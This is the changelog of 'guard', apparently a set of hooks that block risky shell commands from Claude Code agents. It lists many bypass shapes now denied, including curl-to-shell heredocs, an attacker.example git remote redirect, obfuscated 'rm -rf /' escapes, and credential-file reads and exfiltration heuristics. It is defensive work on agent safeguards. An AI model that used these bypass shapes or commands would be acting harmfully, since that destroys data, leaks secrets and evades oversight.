# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and this project
adheres to [Semantic Versioning](https://semver.org/).

## [Unreleased]

## [1.3.1] - 2026-05-13

### Security

- Closed `gh api graphql` mutation bypass: `gh api -X DELETE|PATCH|PUT`
  was already denied via `bash.gh_api_destructive`, but
  `gh api graphql -f query='mutation { ... }'` is a POST to `/graphql`
  carrying a GraphQL mutation (`deleteIssue`, `archiveRepository`,
  `transferOwnership`, etc.) that slipped past the verb filter. The
  matcher now also denies any `gh api` invocation against the
  `graphql` / `/graphql` endpoint when the `mutation` keyword appears
  in the normalized command, and denies opaque-body shapes
  (`-f query=@file.graphql`, `-f query=-`) against the same endpoint.
  Read-only `query` / `subscription` shapes continue to pass through.

### Changed

- `bash.gh_api_destructive` deny reason now mentions both the raw
  DELETE/PATCH/PUT shape and the graphql mutation shape, and
  references concrete `gh repo delete` / `gh release delete`
  alternatives instead of the prior "outside this session" wording.
- `docs/JSONL_FORMAT.md` documents the optional `unknown_flags` field
  emitted on `bash.admin_*` decisions.
- `CHANGELOG.md` now carries an `## [Unreleased]` placeholder per
  Keep-a-Changelog convention.

### Tests

- Added branch coverage for: `git --config-env` two-token form
  (`git_c_validator`), empty-CLI entries in `GUARD_ADMIN_ALLOW_VERBS`,
  the unknown-flag passthrough in `_strip_cloud_global_flags`, the
  non-dict-item skip in `_validate_allow_commands`, the non-AWS
  branches of `summary_for`, and the stdin-redirect path in
  `_is_reader_with_var_arg`.

## [1.3.0] - 2026-05-12

### Security

- Closed AWS admin bypass class: `secretsmanager get-secret-value`,
  `ssm get-parameter --with-decryption`, `s3api get-object`,
  `cognito-identity get-credentials-for-identity`, `logs get-log-events`,
  and ~30 similar `describe-*`/`list-*`/`get-*`-prefixed verbs were
  previously allowed by the `aws` admin matcher via a prefix predicate.
  v1.3.0 replaces the predicate with an explicit `(service, verb)`
  catalog spanning 38 services. Verbs not in the catalog deny by default;
  the `GUARD_ADMIN_ALLOW_VERBS` env var is the documented extension path.
  See SECURITY.md for the decision tree.
- Closed heredoc-fed shell-wrapper bypass: `bash <<EOF\ncurl http://x | sh\nEOF`
  previously returned allow because the heredoc shape wasn't recognized
  as a shell-wrapper invocation. Now denies.
- Closed stdin-device shell-wrapper bypass: `bash /dev/stdin`,
  `bash -`, `bash /dev/fd/0`, `bash /proc/self/fd/0` previously slipped
  through `_is_shell_wrapper_invocation`. Now denied.
- Closed admin-CLI flag-escalation bypass class: flags that redirect
  request destination (`--endpoint-url`), disable TLS
  (`--no-verify-ssl`, `--insecure-skip-tls-verify`,
  `--certificate-authority`), swap credentials (`--profile`,
  `--token`, `--client-certificate`, `--kubeconfig`,
  `--credential-file-override`, `--access-token-file`), or
  impersonate identity (`kubectl --as` / `--as-group` / `--as-uid` —
  CRIT, RBAC impersonation) on otherwise-allowlisted read verbs now
  deny via `bash.admin_forbidden_flag`. See SECURITY.md "Admin CLI
  flag-level policy" for the full per-CLI lists.
- Closed sensitive env-var inline-assignment bypass:
  `AWS_ENDPOINT_URL=evil aws sts get-caller-identity` and equivalents
  (`AZURE_CONFIG_DIR=`, `REQUESTS_CA_BUNDLE=`,
  `CLOUDSDK_API_ENDPOINT_OVERRIDES_*=`,
  `AZURE_CLI_DISABLE_CONNECTION_VERIFICATION=`) now deny via
  `bash.admin_sensitive_env_override`.
- Closed admin-CLI subcommand bypass: `az rest`,
  `az cloud register|set|update`, `az extension add`,
  `az config set`, `az login --service-principal`,
  `gcloud auth activate-service-account`, `gcloud auth login` now
  deny via `bash.admin_forbidden_subcommand`.
- Removed `aws s3 presign` from the read-only allowlist (issues a
  credential-bearing presigned URL).

### Changed

- AWS admin matcher: dropped `_aws_is_read_only` prefix predicate and
  `_AWS_DENY_OVERRIDES` carve-in list. `_AWS_SPEC` now matches the shape
  of `_GCLOUD_SPEC` / `_AZ_SPEC` / `_KUBECTL_SPEC` / `_LAUNCHCTL_SPEC`.
- `_AWS_READ_ONLY_VERBS` expanded from 14 tuples to ~1000 via
  `_AWS_READ_ONLY_VERBS_BY_SERVICE` (38 services).
- `dynamodb scan`, `dynamodb query`, `dynamodb batch-get-item`, and
  `rds generate-db-auth-token` removed from the read-only allowlist
  (these returned item content or credential material).
- `summary_for("aws")` returns "explicit verb catalog; see SECURITY.md".
- `bash.admin_default_deny` body now interpolates the failed verb tuple
  and ends with `add aws:<service>.<verb> to GUARD_ADMIN_ALLOW_VERBS to override.`
- CI gains a blocking `semgrep` job that fails on prefix predicates
  inside read_only_predicate functions.

### Added

- `.semgrep/rules/no-prefix-predicate-in-readonly.yml` and
  `.semgrep/rules/no-startswith-in-predicate-field.yml`: CI rules that
  fail the build if a `.startswith()` prefix predicate is reintroduced
  as a read-only check.
- New `semgrep` CI job alongside `bandit` / `pip-audit` / `vulture`.
- `tests/integration/test_aws_bypass_smoke.py`: E2E smoke for the 9
  named bypass shapes from the SECURITY.md threat model.
- `tests/integration/test_heredoc_bypass.py`: regression coverage for
  heredoc-fed shell wrappers.
- `tests/integration/test_stdin_device_bypass.py`: regression coverage
  for stdin-device shell-wrapper shapes.
- `tests/integration/test_admin_forbidden_flags.py` /
  `test_admin_forbidden_subcommands.py` /
  `test_admin_env_overrides.py` / `test_admin_unknown_flags.py` /
  `test_admin_red_team_shapes.py`: full coverage of the flag-level
  policy across aws/gcloud/az/kubectl.
- `tests/integration/aws_catalog_smoke_corpus.txt` + wheel-install
  install-smoke step that runs the corpus against the built wheel.
- `AdminCliSpec` extended with `forbidden_flags`,
  `forbidden_subcommands`, `known_flags`, `sensitive_env_vars`
  fields (back-compatible — default empty for non-admin specs).
- JSONL audit record gains `unknown_flags: [...]` field on admin-CLI
  decisions (flag names only, capped at 8, omitted when empty).

### Yanked

- v1.2.0 has been yanked from PyPI (reason: superseded by 1.3.0; fixes
  admin allowlist bypass for AWS `get-*` verbs that emit secret
  material). The git tag is preserved.

## [1.2.0] - 2026-05-12

### Added

- `bash.admin_default_deny`: cloud-admin CLIs (`aws`, `gcloud`, `az`, `kubectl`,
  `launchctl`) flip from verb-denylist to default-deny. Only verbs on the
  read-only allowlist pass; everything else denies. Override via
  `allow_commands`, `disable_rules`, or `GUARD_ADMIN_ALLOW_VERBS=<cli>:<verb.path>`.
- Mode-aware agent-guidance footer on every deny: interactive denies tell agents
  to explain + ask before applying overrides; autonomous denies tell agents to
  surface and stop.
- `guard test` accepts multiple commands in one invocation:
  `guard test "cmd1" "cmd2" "cmd3"`. JSON shape changed from
  `{"command", "results"}` to `{"commands": [{"command", "results"}, ...]}`.
  Single-command callers get a 1-element array.

### Fixed

- Three CRIT IAM escalation bypasses: `aws iam attach-user-policy`,
  `az role assignment create`, `gcloud projects add-iam-policy-binding`.
- HIGH `launchctl kickstart -k` persistence bypass.
- HIGH `--` end-of-flags terminator bypass on `az`/`gcloud`/`kubectl`
  extractors (`az account show -- storage blob upload`,
  `kubectl get pods -- delete deployment myapp`). Admin commands with tokens
  after `--` now deny without further interpretation.
- Internal: `_kubectl_verb` now returns multi-positional verbs so
  `kubectl auth can-i` and `kubectl config view` resolve correctly.

## [1.1.0] - 2026-05-11

### Added — new matchers

- `bash.process_tree_kill`: `kill -9 -1`, `killall5`, and
  `pkill -u <user>` / `killall -u <user>` are denied. Kill-all-reachable
  shapes take down the session itself and leave the host unrecoverable.
- AWS IAM policy mutations: `put-role-policy`, `put-user-policy`,
  `put-group-policy`, `detach-*-policy`, and `update-assume-role-policy`
  join the IAM `delete-*` deny set. Inline deny-all policies achieve
  account lockout without a deletion to undo.
- `osascript` joins the dangerous-interpreter set. `osascript -e
  'do shell script "..."'` is a full macOS shell-exec primitive
  equivalent to `sh -c`; the `-l JavaScript` variant is covered by the
  same matcher.
- `defaults write com.apple.loginwindow LoginHook …` (and any `*Hook`
  key on the loginwindow / loginitems domain) is denied as a
  persistence shape. Installs a script that runs at every macOS login.
- `git remote add|set-url|rename|remove|rm|prune|update|set-head|set-branches`
  are denied. The bare `git remote` (listing) and read-only forms
  (`-v`, `show`, `get-url`) still pass through. Closes the
  supply-chain redirect where `git remote set-url origin
  https://attacker.example/evil.git` followed by `git push` quietly
  pushes to the attacker.

### Added — CLI log-query filters

- `guard noisy`, `guard silent`, and `guard trace` accept `--decision`,
  `--hook`, and `--tool` flags. `JsonlReader.iter_records` already
  supported these filters internally; the CLI now exposes them so
  questions like "did Claude touch a `Write` tool this week with a
  `deny` decision?" need one command instead of `jq` plumbing.

### Fixed

- `subagent_scope`: relative paths in the Bash branch now resolve
  against the *payload* `cwd` (the agent's working directory at
  decide-time), not the hook process's cwd. Previously `echo x >
  src/allowed.py` with payload cwd `/tmp/sess/` could be wrongly
  denied if process cwd happened to be elsewhere.
- `agent_output_guard`: the `.output` matcher no longer fires on
  paths ending in `.output.bak` (or any `.output.<suffix>`). The
  trailing negative-lookahead class was missing the `.` character.
- `commit_message_validator` no longer reverse-engineers shell quoting
  with regex. Replaced with a single `shlex.split` pass plus a forward
  walk over the post-`git commit` token slice. The shell parser
  resolves quoting semantics, so escaped quotes inside `-m` bodies,
  no-space `-m"msg"`, combined `-am`, and unbalanced quotes are all
  handled uniformly. Tokenises linearly, so no scan-window cap is
  needed against adversarial input.
- `guard test` now fans out to all six bash-surface hooks instead of
  the three that were hardcoded in `cmd_test`. Concrete bypass this
  catches: `guard test "tar --create -f /tmp/x.tar ~/.aws/credentials"`
  now returns `ask` from `guard.credential_check` (was `passthrough`
  because `credential_check`, `agent_output_guard`, and
  `protected_files` were silently skipped by the CLI even though they
  act on `Bash` input).

### Changed — internals

- New `src/guard/hooks/_registry.py` is the single source of truth for
  the hook list. `HookSpec` entries with surfaces + a normalised
  `decide` adapter; adapters lazy-import their hook module so the
  registry stays import-time pure. `cmd_test`, `cmd_diff`,
  `allowlist.KNOWN_RULE_IDS`, and `_settings_reference_guard` derive
  from it. `tests/test_hook_registry.py` walks `src/guard/hooks/*.py`
  and asserts every `_HOOK_ID` literal is registered, so the next hook
  addition can't silently miss the wiring.
- `protected_files` exposes a pure `decide()` so the registry adapter
  and the production `hook()` share one code path instead of two that
  drift.

### Polish — deny-message copy

- Deny strings rewritten across `bash.gh_api_destructive`,
  `bash.gpg_secret_delete`, `bash.process_attach`, `bash.kernel_module_load`,
  `bash.network_policy_wipe`, `bash.sensitive_write`, `bash.persistence`,
  `bash.sudo_escalation`, `bash.disk_destruction`, `bash.aws_destructive`,
  and `bash.iac_destruction`. The "refuse." absolutism and matcher-internal
  commentary ("refused regardless of flag ordering...") have been replaced
  with a concrete next-step path (run in a controlled terminal, edit via
  the Edit tool, review the plan output, etc.). The `_format_deny_reason`
  footer still appends the override path, so the body is now consistently
  threat-shape + alternative.

### Test coverage

- Direct regression tests added for previously-untested defensive paths:
  `open_safe`'s `O_NOFOLLOW` symlink refusal (security-sensitive TOCTOU
  guard); `_read_message_file`'s `ValueError`/`OSError` fallback;
  `credential_check._expand`'s `OSError` fallback;
  `git_c_validator._decide_stash`'s unknown-action fallthrough;
  `agent_output_guard.hook`'s non-dict `tool_input` passthrough;
  `allowlist._validate_allow_commands`'s non-list warning branch.

### Packaging

- CI + release smoke matrices now include Python 3.12 alongside 3.11
  and 3.13, matching the `Programming Language :: Python :: 3.12`
  classifier in `pyproject.toml`.

### Docs

- README hook table rows for `commit_message_validator`,
  `agent_output_guard`, and `subagent_scope` now describe the
  actual matchers (path-based, not size-based; file-edit scope,
  not Task dispatch). Added `GUARD_PROTECTED_EXTRA` to the env
  var table.
- SKILL.md: `subagent_scope` description fixed to match
  implementation; `--scope project|global` flag references replaced
  with the actual `--global` / `--project` boolean pair; allowlist
  CLI examples use the real `--rule` / `--command` / `--reason`
  flag form; `GUARD_PROTECTED_EXTRA` file/env precedence wording
  matches `protected_files._extra_patterns` (file replaces env,
  not merges).
- README "CLI never writes" claim narrowed — query subcommands
  (`status`, `noisy`, `silent`, `trace`, `diff`, `test`) are
  read-only, but `guard allowlist *` mutations write to the
  allowlist file.

## [1.0.0] - 2026-05-09

### Added — allowlist (per-rule disable + per-command override)

- Per-rule `disable_rules` and per-command `allow_commands` mechanisms
  let users silence individual rules or specific commands without
  forking the plugin. Project-scoped (`.claude/guard/allowlist.json`)
  and global (`~/.claude/guard/allowlist.json`) allowlists merge with
  project precedence. CLI: `guard allowlist {list,rules,disable-rule,
  enable-rule,allow-command,remove-command}` with `--global` /
  `--project` flags. Every bypass is logged as a `decision="pass"`
  audit record. See `SKILL.md`.
- `protected_files` trust-root: writes to `.claude/guard/allowlist.json`
  and `.claude/settings*.json` are NOT allowlist-bypassable — those
  files control whether guard runs at all and whether allowlist
  overrides apply, so they always go through ASK.

### Changed — deny-string template (rule_id + override path)

- `bash_command_validator`: every allowlist-routed deny (always-deny,
  synthetic-deny, credential-leak) now ends with `Rule: <rule_id>.
  Override: \`guard allowlist allow-command <rule_id> '<command>'
  --reason '...'\` or \`guard allowlist disable-rule <rule_id>\`.` —
  users hit by a false positive can act without grepping the source.
  Helper `_format_deny_reason` keeps the footer identical across
  matchers so the shape is learnable. Pre-deny shapes (pipe-to-shell,
  dangerous-construct, conditional-safe denied flag) keep their
  existing reasons — they are not allowlist-routed.

### Hardened — bash canonicalization

- `bash_command_validator`: ANSI-C `$'\NNN'` octal escapes now decoded
  before per-form matchers (`$'\162\155' -rf /` no longer slips past
  the `rm` deny). `{x..x}` single-element brace-range expansion is
  identity-expanded so `{r..r}m -rf /` and `{g..g}it push
  --force-with-lease` are detected (multi-element ranges still
  refused — they're a DoS surface, not a real bypass class).

### Hardened — extractor coverage + safe-IO

- `protected_files`: `find -fprint`/`-fprintf`/`-fls`/`-fprint0` write
  targets now extracted; `nvim --headless` recognised as batch mode
  (was bypass); macOS APFS / Windows NTFS case-insensitive matching so
  `.Claude/CLAUDE.md` no longer evades `is_protected`.
- `protected_files`: trust-root patterns
  (`.claude/guard/allowlist.json`, `.claude/settings*.json`) are NOT
  allowlist-bypassable.
- `protected_files`: `.claude/guard-protected.txt` now read via shared
  safe-IO (cwd-scope, O_NOFOLLOW, 64 KiB cap, 256-pattern cap, corrupt
  UTF-8 → no extras).
- `protected_files`: interpreter eval-body scan raised to 1 MiB and
  emits a forced-ASK sentinel on overflow — no silent truncation.
- `_safe_io`: sensitive-read denylist gains `/var/run/secrets/`,
  `/var/lib/kubelet/`, `~/.bash_history`, `~/.zsh_history`, `~/.npmrc`,
  `~/.pypirc`, `~/.config/sops/`.

### Changed — shared safe-IO primitives

- New `guard._safe_io` module consolidates the cwd/temp scope check,
  sensitive-target denylist, stream-shape detection, and `O_NOFOLLOW`
  + size-cap read into one audited surface. `commit_message_validator`
  and `protected_files` (`patch -i <diff>` reader) now share the same
  primitives. Diff reads bounded to 256 KiB; interpreter eval-body
  substring scan bounded to 32 KiB.

### Added — protected_files project-local extension

- `GUARD_PROTECTED_EXTRA` env var (comma-separated) and
  `.claude/guard-protected.txt` project file (one pattern per line,
  `#` for comments) extend `PROTECTED_PATTERNS` without forking. File
  wins over env. See `SKILL.md`.

### Added — protected_files extractor coverage

- `ex -sc <cmd> <target>` and `vim -es -c <cmd> <target>` /
  `vim -es +<cmd> <target>` batch-mode editors now extract the trailing
  positional as a write target. Bare interactive `vim <file>` is NOT
  flagged.
- `patch -i <diff>` and `patch < <diff>` (stdin redirect) now read the
  diff body and extract `--- a/<path>` / `+++ b/<path>` headers as
  candidate targets. `--- /dev/null` (added-file marker) is ignored.
- `find <root> -exec <cmd> ... \;` emits `<root>` as a candidate so a
  recursive search rooted in a protected directory gets ASK'd.
- Per-interpreter eval-flag map: `python|python3 -c`, `node|deno|bun
  -c|-e|--eval`, `perl|ruby -e`, `php -r`. The body of the eval string
  is scanned for literal protected-pattern substrings; matches surface
  the protected path. Versioned basenames (`python3.11`) handled.

### Added — orchestration destruction coverage

- `bash_command_validator`: ~30 new synthetic-deny matchers covering
  - **Cloud destruction**: `aws iam/ec2/rds/lambda/dynamodb/eks/ecr/ecs/kms/secretsmanager/ssm/s3` destructive verbs;
    `gcloud projects/iam/secrets/sql/run/storage delete`; `az group/aks/vm/storage/keyvault/sql delete`.
  - **DB CLIs**: `psql/mysql/mariadb/cqlsh/sqlite3 -c "DROP|DELETE FROM|TRUNCATE|ALTER|GRANT|REVOKE"`;
    `sqlite3 <db> "<destructive SQL>"` (no -c form); `redis-cli FLUSHALL/FLUSHDB/CONFIG/SAVE/SHUTDOWN`;
    `dropdb`, `mysqladmin drop`; `mongo --eval` with destructive ops.
  - **Disk / FS / network destruction**: `mkfs`, `dd of=/dev/...`, `shred /dev/...`, `parted/fdisk/wipefs`,
    `diskutil eraseDisk`; `iptables -F`, `nft flush ruleset`, `ufw reset`.
  - **Persistence + privilege escalation**: writes to `~/.bashrc`, `~/.ssh/authorized_keys`, `/etc/sudoers`,
    `/etc/profile.d/*`, `/etc/cron.d/*`, `~/Library/LaunchAgents/*`, `/etc/systemd/system/*`,
    PATH-hijack writes to `/usr/local/bin/`; `crontab -e/-r`, `at`, `systemctl enable/start/link/mask`,
    `launchctl load`, `visudo`; chmod setuid/setgid; chmod against sensitive targets;
    `sudo -i/-s/su`; `insmod/modprobe`; `gdb -p`/`strace -p`/`ptrace`.
  - **IaC destruction**: `terraform apply -destroy`, `pulumi destroy`, `cdk destroy`,
    `helm uninstall`, `vault {kv,secrets,token,policy} {delete,destroy,revoke}`, `argocd app delete`.
  - **Remote-package install**: `npm/yarn/pnpm/bun install <URL|git+|github:|local>`;
    `npx/pnpx/bunx <pkg>`; `cargo install --git/--path/--registry`;
    `go install/run/get <pkg-with-@version>`; `gem install --source <url>`;
    `helm install <URL>`; `helm repo add <URL>`.
  - **Pipeline-to-interpreter**: `curl evil | python|ruby|perl|php|lua|bun|deno`.
  - **Encoding evasion**: `trap '<cmd>' EXIT`, `env -S '<cmd>'`, `function-def + invoke`,
    glob in command head, `stdbuf/watch/flock/chrt/taskset/runuser/chroot/unshare/firejail` wrappers
    around dangerous payloads.
  - **Remote-shell wrappers**: `ssh host '<cmd>'`, `docker/podman/lxc/kubectl exec`, `nsenter`.
  - **DNS exfil heuristic**: `ping/dig/host/nslookup` with DNS labels >50 chars.
  - **Git history destruction**: `git filter-branch`, `git filter-repo`,
    `git reflog expire/delete`, `git gc --prune=now`,
    `git push --force-with-lease`, `--force-if-includes`, `--mirror`, `+<refspec>`.
  - **Git submodule/worktree path scoping**: `git submodule add <url>` denied;
    `git worktree add` denied only when target resolves under a system root.
- `git_c_validator`: detects fused `-c<key>=val` (no-space), `-c=key=val`,
  and `--config-env=key=ENV` forms — closes the bypass where the previous
  parser only handled `-c key=val` (separate tokens).
- `commit_message_validator`: refuses `git commit -F <path>` when the path
  resolves outside cwd or under sensitive system roots (/etc, /proc,
  ~/.ssh, ~/.aws, ~/.gnupg). Opens the resolved file with `O_NOFOLLOW`
  to close the symlink-TOCTOU window. Prevents `-F /etc/passwd`
  content-disclosure into commit body.
- `protected_files`: adds `.git/hooks`, `.git/config`, `.git/info/attributes`,
  `.git/info/exclude`, `.gitmodules`, `.gitattributes`. Directory-pattern
  matching scoped to patterns whose last segment has no `.`.
- Registry: `GIT_CONFIG_EXEC_SINKS` extended with `core.attributesfile`,
  `color.pager`, `uploadpack.packobjectshook`, `protocol.allow`,
  `receive.procreceiverefs`. Glob patterns extended with `pager.*` and
  `protocol.*.allow`.
- Test surface: 500+ parametrized cases in
  `tests/integration/test_synth_matchers_coverage.py` exercising every
  matcher family with paired DENY / LEGIT cases.

### Fixed (review pass 4)

Pass-4 surfaced verified bypasses across three classes; all closed below.

**Shell-semantics bypasses (`bash_command_validator`):**

- ANSI-C `$'...'` quoting (Bash Reference Manual §3.1.2.4) is decoded at
  the canonicalization layer. Without this, a head spelled
  `$'\x64\x72\x6f\x70\x64\x62'` (= `dropdb`) reached every per-form
  matcher as the literal escape string and bypassed head-token checks.
- Bash brace expansion (`{r,r}m -rf /`, `tee /etc/{sudoers.d/x,profile.d/x.sh}`)
  is expanded line-by-line. Newlines preserved so pipeline-split keeps
  per-line segmentation.
- Shell control-flow keywords (`then`, `else`, `elif`, `do`, `in`, `;;`,
  `if`, `while`, `until`, `for`, `case`) are stripped from segment heads
  after pipeline-split. Before this, `if true; then rm -rf /; fi` and
  `for i in 1; do rm -rf /; done` produced segments whose heads were
  `then`/`do` and missed every matcher. Bare `fi`/`done`/`esac`
  terminators are dropped.

**Cloud-CLI matchers (`bash_command_validator`):**

- `aws`/`gcloud`/`az` now walk past leading global flags before indexing
  into the destructive-path tuple. Pass-3 closed the same defect for
  `git -c`; the cloud matchers retained the rigid `tokens[1]/[2]` shape.
  Bypassed shapes now denied: `aws --region X ec2 terminate-instances`,
  `aws --profile prod iam delete-user`, `gcloud --format json projects
  delete`, `gcloud --quiet projects delete`, `az --subscription X group
  delete`, `az -o json keyvault delete`.

**Per-matcher coverage extensions:**

- `vault` matcher now covers `token revoke`/`revoke-self`/`revoke-orphan`,
  `secrets disable`, `policy delete`, `auth disable`, `lease revoke`/
  `revoke-prefix` (was: only `kv destroy`/`metadata delete`).
- `mongosh` now denies `-e <body>` (short alias of `--eval`) and
  `--file <path>`/`-f <path>`/`--file=<path>` — file body is opaque so the
  matcher refuses rather than allowing blindly.
- Disk-destruction matchers (`mkfs.*`, `dd of=`, `shred`, `parted`,
  `wipefs`) now treat filesystem-image paths (`.img`, `.iso`, `.qcow2`,
  `.vhd[x]`, `.vmdk`, `.raw`, `.dd`) as device-equivalents. Formatting an
  image and booting it is the same threat shape as targeting `/dev/`.

**Audit-log hardening (`_utils.py`):**

- `log_decision` now applies a focused secret-redaction pass to both
  `command_excerpt` and `reason` before persistence. 18 vendor-specific
  shapes covered (AWS access-key IDs, Anthropic / OpenAI / generic
  `sk-*` keys, GitHub PAT/OAuth/server tokens, GitLab PAT, Slack tokens,
  Stripe keys, SendGrid, npm, PyPI macaroons, JWT bearer, PEM private
  keys, `Authorization: Bearer …` headers, `KEY=value` for credential-named
  keys). Without this the JSONL log was a side-channel exfiltration
  target — any process able to read it harvested every secret the agent
  typed, indexed by hook and timestamp.
- `append_jsonl` now opens the log path with `O_NOFOLLOW | O_CLOEXEC`
  and creates the parent directory at mode `0o700`. Prevents a
  pre-planted symlink at `~/.claude/guard-decisions.jsonl` from turning
  guard's append into an arbitrary-write primitive against
  attacker-chosen targets (e.g. `/etc/cron.d/x`).

### Fixed (review pass 3)

- `_is_git_worktree_add` now consumes value-flags (`-b`, `-B`, `--reason`,
  `--track`) as flag+value pairs before locating the path positional. Pass-2
  flag-skip logic was naive: `git worktree add -b exploit /etc/systemd/system
  HEAD` skipped `-b` then matched `exploit` (the branch name) as the path,
  cleared it, and bypassed the deny on `/etc/systemd/system`.

### Fixed (review pass 2)

- `_is_git_worktree_add` no longer denies `git worktree add /Users/...` /
  `/home/...` — pass-1 reused `_DANGEROUS_PATH_PREFIXES` which includes user
  home roots, breaking the canonical worktree shape on macOS/Linux. New
  `_WORKTREE_DANGEROUS_PREFIXES` excludes `/Users/`, `/home/`, `/private/`.
- `_is_chmod_sensitive_target` no longer denies hardening commands like
  `chmod 600 ~/.ssh/id_rsa`. Now: any chmod against system roots
  (`/etc/sudoers`) denies; chmod against home subset (`~/.ssh`, `~/.aws`,
  `~/.gnupg`) denies only when the mode grants group/other access.
- New `_SYNTH_CHMOD_SENSITIVE_TARGET_DENY` label so the audit-log reason
  no longer claims "setuid/setgid bit" when the trigger was a permissive
  mode against a sensitive path.
- CI smoke jobs (`install-smoke`, `testpypi-smoke`) now install
  `pytest-xdist` so the suite-wide `addopts = -n auto --dist loadfile`
  doesn't fail with `unrecognized arguments`.

### Fixed (review pass)

- `_match_always_deny_literal` recognises `prefix=value` form
  (`git push --force-with-lease=ref` was bypassing the literal DENY).
- `git push +HEAD:main` (3-token, no remote) now denied (was missing the
  refspec-force matcher).
- `bun run /tmp/x.js` / `bun test ./script.ts` denied (was exempted as
  package subcommand; now distinguishes script-name from script-path).
- `chmod 666 /etc/sudoers` denied (was passing because `_is_chmod_dangerous`
  required recursive AND 777).
- `docker exec --help <container> rm -rf /` denied (the `--help`
  short-circuit was positional-blind; now requires `--help` to stand alone).
- `_is_pipe_to_interpreter` wired into the dispatcher (was orphan).

### Foundational hooks (initial 1.0 surface)

Guard ships seven stdlib-only `PreToolUse` hooks that sit between Claude
Code and the tool surface, denying high-risk actions before they reach
the host. The hook contract, decision-log schema, and autonomous-mode
behavior are stable for the 1.x line.

- `bash_command_validator` — denies dangerous shell shapes (rm -rf,
  fork bombs, curl|sh, interpreter `-c` eval, runner-prefix bypasses).
- `git_c_validator` — blocks `git -c <key>=<val>` injection of executable
  config keys (alias.\*, core.pager, core.editor, filter.\*).
- `credential_check` — scans tool inputs for API keys, tokens, private
  keys, and provider-specific secret shapes before they leave the agent.
- `commit_message_validator` — rejects commit messages that leak
  AI-tool attribution markers (Co-Authored-By footers, generated-with
  notices, named tool branding).
- `agent_output_guard` — denies direct reads of dispatched-subagent
  output transcripts so context is preserved for the orchestrator.
- `protected_files` — forces an ASK confirmation on edits to guard's
  own validator files and to the Claude Code settings files that
  govern hook activation.
- `subagent_scope` — restricts what a dispatched subagent can read or
  modify based on a per-task allowlist.
- JSONL decision log (schema v1) at `~/.claude/guard-decisions.jsonl`
  for after-the-fact audit of every allow/deny.
- Autonomous-mode strict default-deny: when `CLAUDE_AUTONOMOUS=1` is set
  the hooks switch to fail-closed semantics for ambiguous inputs.

### Security

- Defense-in-depth posture: each hook is independent, and a deny from
  any hook short-circuits the tool call. See [SECURITY.md](SECURITY.md)
  for the threat model and reporting policy.
- Mitigates the class of agent-confusion bypasses tracked under
  CVE-2025-59356 by validating the literal command shape rather than
  trusting model-emitted intent.

[1.3.0]: https://github.com/TracineHQ/guard/compare/v1.2.0...v1.3.0
[1.2.0]: https://github.com/TracineHQ/guard/compare/v1.1.1...v1.2.0
[1.1.1]: https://github.com/TracineHQ/guard/compare/v1.1.0...v1.1.1
[1.1.0]: https://github.com/TracineHQ/guard/compare/v1.0.0...v1.1.0
[1.0.0]: https://github.com/TracineHQ/guard/releases/tag/v1.0.0
